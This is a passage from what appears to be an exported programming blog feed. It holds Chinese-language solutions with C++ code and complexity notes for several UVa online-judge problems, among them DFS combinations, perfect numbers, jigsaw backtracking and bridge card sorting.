<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="keyword">int</span> n,m,res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s&gt;&gt;n&gt;&gt;m)&#123;</span><br><span class="line">		res=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=s.size()<span class="number">-1</span>, j=<span class="number">0</span> ; i&gt;=<span class="number">0</span> ; i--, j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i]&lt;=<span class="string">'9'</span>)&#123;</span><br><span class="line">				res += (s[i]-<span class="string">'0'</span>)*<span class="built_in">pow</span>(n,j);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				res += (s[i]-<span class="string">'A'</span>+<span class="number">10</span>)*<span class="built_in">pow</span>(n,j);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">string</span> ans=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">if</span>(res==<span class="number">0</span>)&#123;</span><br><span class="line">			ans=<span class="string">"      0"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">for</span>( ; res &amp;&amp; ans.size()&lt;=<span class="number">7</span> ; res/=m)&#123;</span><br><span class="line">				<span class="keyword">int</span> tmp=res%m;</span><br><span class="line">				<span class="keyword">if</span>(tmp&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">					ans = <span class="keyword">char</span>(tmp<span class="number">-10</span>+<span class="string">'A'</span>) + ans;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					ans = <span class="keyword">char</span>(tmp+<span class="string">'0'</span>) + ans;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans.size() &gt; <span class="number">7</span>)&#123;</span><br><span class="line">			ans=<span class="string">"  ERROR"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=ans.size() ; i&lt;<span class="number">7</span> ; i++)&#123;</span><br><span class="line">				ans=<span class="string">' '</span> + ans;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>先轉換成十進位的時間複雜度為 $O(log_{10}{n})$</p>
<p>轉換成其他進位的時間複雜度為 $O(log_{10}{n})$</p>
<p>總時間複雜度約為 $O(log_{10}{n})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 441</title>
    <url>/2021/04/27/UVa441/</url>
    <content><![CDATA[<h1 id="UVa-441"><a href="#UVa-441" class="headerlink" title="UVa 441"></a>UVa 441</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?441" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?441</a></p>
<p>給一個正整數 $k$ 以及 $k$ 個由小到大排序好的數字，輸出所有序列長度為 $6$ 的組合，所有組合皆由小到大輸出</p>
<p>$6 &lt; k &lt; 13$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為題目要求組合而非排列，所以說像是 $(1, 2, 3)$ 和 $(2, 1, 3)$ 會被視為相同的</p>
<p>所以我們可以這麼想，這些會被視為相同的組合在由小到大排序過後都是一樣的</p>
<p>所以我們可以直接找那個由小到大嚴格遞增的那個，在上例中就是 $(1, 2, 3)$</p>
<p>既然 $k$ 不大，我們就可以考慮使用 DFS 去枚舉出所有的狀況</p>
<p>並且為了保持每個組合的遞增性，記錄上次最後存取的元素位置，下次就只能從那個位置之後繼續枚舉</p>
<p>例如說給定的序列是 ${1, 2, 3, 4}$</p>
<p>現在枚舉到 ${1, 3}$ 的時候，下次就不需要再看 $3$ 以前的數字了，只需要看 $3$ 以後的數字</p>
<p>如此一來，我們就可以在維持序列遞增性的前提下去枚舉出所有情況了!</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, tmp[<span class="number">6</span>], arr[<span class="number">15</span>], res[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">int</span> start)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 已經找好六個數字了 </span></span><br><span class="line">	<span class="keyword">if</span>(depth == <span class="number">6</span>)&#123;</span><br><span class="line">		<span class="comment">// 把結果複製到 tmp </span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">6</span> ; i++)&#123;</span><br><span class="line">			tmp[i] = res[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">6</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(i) <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;tmp[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 從 start 開始枚舉</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=start ; i&lt;n ; i++)&#123;</span><br><span class="line">		res[depth] = arr[i];</span><br><span class="line">		dfs(depth+<span class="number">1</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		dfs(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>每筆測資輸入時間複雜度為 $O(n)$</p>
<p>DFS 每一層最多會有 $n$ 個選擇，總共有 $6$ 層</p>
<p>每筆測資 DFS 時間複雜度為 $O(n^6)$</p>
<p>每筆測資總時間複雜度約為 $O(n^7)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 382</title>
    <url>/2021/03/23/UVa382/</url>
    <content><![CDATA[<h1 id="UVa-382"><a href="#UVa-382" class="headerlink" title="UVa 382"></a>UVa 382</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?382" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?382</a></p>
<p>給很多個數字 $n$ ，對於每個 $n$ ，求該數字的所有因數，不包含自己本身的總和</p>
<p>如果等於輸出 <code>PERFECT</code> ，若小於輸出 <code>DEFICIENT</code> ，若大於輸出 <code>ABUNDANT</code></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每個 $n$ 暴力掃過一遍看看有那些因數，加總起來判斷</p>
<p>至於輸出要對齊的部分，這邊採用 log 的方式得知求出的數字是幾位數，進而判斷出應該要填充多少的空格</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, cnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"PERFECTION OUTPUT\n"</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		cnt=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(n%i==<span class="number">0</span>)&#123;</span><br><span class="line">				cnt+=i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>, p=<span class="number">5</span>-((<span class="keyword">int</span>)<span class="built_in">log10</span>(n)+<span class="number">1</span>) ; i&lt;p ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="string">"  "</span>;</span><br><span class="line">		<span class="keyword">if</span>(cnt==n)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"PERFECT\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cnt&lt;n)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"DEFICIENT\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"ABUNDANT\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"END OF OUTPUT\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>每筆測試資料時間複雜度為 $O(n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 399</title>
    <url>/2021/04/27/UVa399/</url>
    <content><![CDATA[<h1 id="UVa-399"><a href="#UVa-399" class="headerlink" title="UVa 399"></a>UVa 399</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?399" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?399</a></p>
<p>有一張由 $d \times d$ 塊 $w \times h$ 大小的拼圖，每一塊拼圖的 上、左、下、右 都分別有一個數字</p>
<p>當兩塊拼圖之間的數字只差一個負號的時候(例如: <code>5</code> 和 <code>-5</code>)這兩塊拼圖就可以放在一起</p>
<p>此外，在四周的拼圖邊上數字都必須是 $0$</p>
<p>舉例來說，我們有這些拼圖</p>
<p><img src="https://i.imgur.com/JMa4VJj.png" alt=""></p>
<p>那麼可行的拼法為</p>
<p><img src="https://i.imgur.com/khq6BXR.png" alt=""></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為拼圖有許多拼法，也許兩塊可以組合在一起，但是卻無法拼成完整的拼圖，因此可以考慮窮舉每個當前可行的情況，如果一直拚到最後一塊也沒問題，那就找到答案了</p>
<p>從左至右，從上至下枚舉每一個空格可以放哪些拼圖，檢查邊界、四周的拼圖<br>除了輸入和判斷比較繁複以外，基本都和 DFS 是相同的概念</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, d, h, w, res[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">bool</span> used[<span class="number">105</span>], found;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">puzzle</span>&#123;</span></span><br><span class="line">	<span class="comment">// 拼圖的每一行</span></span><br><span class="line">	<span class="built_in">string</span> line[<span class="number">30</span>];</span><br><span class="line">	<span class="comment">// 上左下右四個數字</span></span><br><span class="line">	<span class="keyword">int</span> above;</span><br><span class="line">	<span class="keyword">int</span> left;</span><br><span class="line">	<span class="keyword">int</span> below;</span><br><span class="line">	<span class="keyword">int</span> right;</span><br><span class="line">&#125;puzzles[<span class="number">105</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">feasible</span><span class="params">(<span class="keyword">int</span> id, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 當前在邊界，要判斷 0</span></span><br><span class="line">	<span class="keyword">if</span>(x==<span class="number">1</span> &amp;&amp; puzzles[id].above != <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(y==<span class="number">1</span> &amp;&amp; puzzles[id].left != <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(x==d &amp;&amp; puzzles[id].below != <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(y==d &amp;&amp; puzzles[id].right != <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//right</span></span><br><span class="line">	<span class="keyword">if</span>(res[x][y+<span class="number">1</span>]!=<span class="number">-1</span> &amp;&amp; puzzles[res[x][y+<span class="number">1</span>]].left != -puzzles[id].right)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//left</span></span><br><span class="line">	<span class="keyword">if</span>(res[x][y<span class="number">-1</span>]!=<span class="number">-1</span> &amp;&amp; puzzles[res[x][y<span class="number">-1</span>]].right != -puzzles[id].left)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//above</span></span><br><span class="line">	<span class="keyword">if</span>(res[x<span class="number">-1</span>][y]!=<span class="number">-1</span> &amp;&amp; puzzles[res[x<span class="number">-1</span>][y]].below != -puzzles[id].above)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//below</span></span><br><span class="line">	<span class="keyword">if</span>(res[x+<span class="number">1</span>][y]!=<span class="number">-1</span> &amp;&amp; puzzles[res[x+<span class="number">1</span>][y]].above != -puzzles[id].below)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == d*d)&#123;</span><br><span class="line">		found=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=d ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;h ; k++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=d ; j++)&#123;</span><br><span class="line">					<span class="built_in">cout</span>&lt;&lt;puzzles[res[i][j]].line[k];</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// x, y 都從 1 開始</span></span><br><span class="line">	<span class="comment">// 這樣 res 四周都會是 -1，判斷邊界就不會超出範圍</span></span><br><span class="line">	<span class="keyword">int</span> x=depth/d+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> y=depth%d+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;d*d &amp;&amp; !found ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!used[i] &amp;&amp; feasible(i, x, y))&#123;</span><br><span class="line">			used[i] = <span class="literal">true</span>;</span><br><span class="line">			res[x][y] = i;</span><br><span class="line">			DFS(depth+<span class="number">1</span>);</span><br><span class="line">			used[i] = <span class="literal">false</span>;</span><br><span class="line">			res[x][y] = <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">0</span> ; t&lt;n ; t++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(t) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 初始化</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">30</span> ; i++)&#123;</span><br><span class="line">			used[i] = <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">105</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">105</span> ; j++)&#123;</span><br><span class="line">				res[i][j] = <span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		found = <span class="literal">false</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 輸入</span></span><br><span class="line">		<span class="comment">// 要特別注意到，要用 getline 之前如果有 cin，後面都需要一個 getchar 去接收換行</span></span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;d&gt;&gt;h&gt;&gt;w;</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;d*d ; i++)&#123;</span><br><span class="line">			<span class="comment">// 每塊拼圖之間有一個空行隔開</span></span><br><span class="line">			<span class="keyword">if</span>(i) getchar();</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;h ; j++)&#123;</span><br><span class="line">				getline(<span class="built_in">cin</span>, s);</span><br><span class="line">				puzzles[i].line[j] = s;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;puzzles[i].above&gt;&gt;puzzles[i].left&gt;&gt;puzzles[i].below&gt;&gt;puzzles[i].right;</span><br><span class="line">			getchar();</span><br><span class="line">		&#125;</span><br><span class="line">		DFS(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>每筆測資輸入時間複雜度為 $O(d^2hw)$</p>
<p>DFS 每層最多有 $d^2$ 種選擇，共 $d^2$ 層</p>
<p>每筆測資 DFS 時間複雜度為 $O(d^{2^{d^{2}}})$</p>
<p>每筆測資輸出時間複雜度為 $O(d^2hw)$</p>
<p>總時間複雜度為 $O(t(2d^2hw + d^{2^{d^{2}}}))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 555</title>
    <url>/2021/03/23/UVa555/</url>
    <content><![CDATA[<h1 id="UVa-555"><a href="#UVa-555" class="headerlink" title="UVa 555"></a>UVa 555</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?555" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?555</a></p>
<p>現在我們要來玩一場橋牌，一場橋牌當中會有一個玩家負責發牌，並且我們會以方位(<code>N</code>, <code>E</code>, <code>S</code>, <code>W</code>)來稱呼玩家</p>
<p>發牌會從發牌者的左手邊開始，逆時針方向發牌，直到第 52 張牌被發到發牌玩家</p>
<p>在發牌結束後，我們需要將所有玩家的手牌依照其大小由小到大排序</p>
<p>每張牌都會有一個花色以及一個數字，其大小順序如下</p>
<ul>
<li>花色<br>  <code>C</code> &lt; <code>D</code> &lt; <code>S</code> &lt; <code>H</code></li>
<li>數字<br>  <code>2</code> &lt; <code>3</code> &lt; <code>4</code> &lt; <code>5</code> &lt; <code>6</code> &lt; <code>7</code> &lt; <code>8</code> &lt; <code>9</code> &lt; <code>T</code> &lt; <code>J</code> &lt; <code>Q</code> &lt; <code>K</code> &lt; <code>A</code></li>
</ul>
<p>最後依照 <code>S</code> <code>W</code> <code>N</code> <code>E</code> 的順序輸出排序後的手牌</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>就直接照著題目的意思去模擬</p>
<p>排序的部分自訂一個 compare function</p>
<p>如果要避免寫太多 if-else 來判斷彼此之間的大小，可以預先建立一個表儲存每個元素對應到的數字</p>
<p>只要保證這些數字之間的大小關係跟題目中要求的元素之間大小關係相同即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> player, pos[<span class="number">128</span>], order[<span class="number">128</span>];</span><br><span class="line"><span class="keyword">char</span> n, color, number;</span><br><span class="line"><span class="built_in">string</span> card, cards[<span class="number">4</span>][<span class="number">13</span>];</span><br><span class="line"><span class="comment">// 為了方便建表，這裡先建立兩個已經排好的字串</span></span><br><span class="line"><span class="built_in">string</span> pos_str=<span class="string">"SWNE"</span>, card_str=<span class="string">"CDSH23456789TJQKA"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="built_in">string</span> p, <span class="built_in">string</span> q)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 直接比較元素之間的大小關係即可</span></span><br><span class="line">	<span class="keyword">if</span>(order[p[<span class="number">0</span>]] != order[q[<span class="number">0</span>]]) <span class="keyword">return</span> order[p[<span class="number">0</span>]] &lt; order[q[<span class="number">0</span>]];</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(order[p[<span class="number">1</span>]] != order[q[<span class="number">1</span>]]) <span class="keyword">return</span> order[p[<span class="number">1</span>]] &lt; order[q[<span class="number">1</span>]];</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">// 預先建方位對應數字的表</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">		pos[pos_str[i]] = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 預先建立卡牌顏色以及數字對應的數字表</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;card_str.size() ; i++)&#123;</span><br><span class="line">		order[card_str[i]] = i;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n!=<span class="string">'#'</span>)&#123;</span><br><span class="line">		<span class="comment">// 這裡可以直接用數字表示方位了!</span></span><br><span class="line">		player = pos[n];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>, j=<span class="number">0</span> ; i&lt;<span class="number">52</span> ; i++)&#123;</span><br><span class="line">			<span class="comment">// 每次都是發給下一位玩家</span></span><br><span class="line">			player = (player+<span class="number">1</span>)%<span class="number">4</span>;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;color&gt;&gt;number;</span><br><span class="line">			<span class="comment">// 把顏色以及數字串起來</span></span><br><span class="line">			<span class="comment">// 注意不能直接用字原相加</span></span><br><span class="line">			card = <span class="string">""</span>;</span><br><span class="line">			card.push_back(color);</span><br><span class="line">			card.push_back(number);</span><br><span class="line">			cards[player][j] = card;</span><br><span class="line">			<span class="comment">// 每經過 4 次，就表示已經發完一輪牌了</span></span><br><span class="line">			<span class="keyword">if</span>((i+<span class="number">1</span>)%<span class="number">4</span> == <span class="number">0</span>) j++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">			sort(&amp;cards[i][<span class="number">0</span>], &amp;cards[i][<span class="number">13</span>], cmp);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;pos_str[i]&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">13</span> ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(j!=<span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;cards[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span 